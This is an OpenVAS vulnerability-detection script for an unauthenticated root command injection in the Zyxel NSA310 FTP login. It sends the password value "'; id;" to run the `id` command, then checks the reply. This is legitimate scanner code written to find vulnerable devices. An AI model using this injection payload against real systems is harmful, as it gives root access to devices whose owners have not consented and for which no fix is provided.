###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_zyxel_nsa310_rce_03_16.nasl 13499 2019-02-06 12:55:20Z cfischer $
#
# Zyxel NSA310 Remote Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
##############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105566");
  script_version("$Revision: 13499 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2019-02-06 13:55:20 +0100 (Wed, 06 Feb 2019) $");
  script_tag(name:"creation_date", value:"2016-03-15 10:52:54 +0100 (Tue, 15 Mar 2016)");
  script_name("Zyxel NSA310 Remote Code Execution Vulnerability");

  script_tag(name:"summary", value:"A remote unauthenticated code execution vulnerability in Zyxel NSA310 allows remote attackers to execute arbitrary code as a `root' user.");
  script_tag(name:"vuldetect", value:"Try to execute the `id' command.");
  script_tag(name:"insight", value:"Due to the way commands are passed inside the system, and lack of proper filtering of user information, an attacker can use the ` (single quote) to escape the original command syntax and introduce additional commands to be executed by the code.");
  script_tag(name:"affected", value:"Zyxel NSA310 V4.70(AFK.1)");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"exploit");

  script_xref(name:"URL", value:"https://blogs.securiteam.com/index.php/archives/2694");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/pure_ftpd/detected");

  exit(0);
}

include("ftp_func.inc");

port = get_ftp_port( default:21 );
banner = get_ftp_banner( port:port );

if( !banner || "Pure-FTPd" >!< banner )
  exit( 99 );

soc = open_sock_tcp( port );
if( ! soc ) exit( 0 );

send( socket:soc, data:"user '" + '\r\n' );
recv = recv( socket:soc, length:512 );

if( "Password" >!< recv )
{
 close( soc );
 exit( 99 );
}

send( socket:soc, data:"pass '; id;" + '\r\n' );

recv = recv( socket:soc, length:512 );

close( soc );

if( recv =~ "uid=[0-9]+.*gid=[0-9]+" )
{
  report = "It was possible to execute the `id' command on the remote system. Response:" + '\n' + recv;
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );

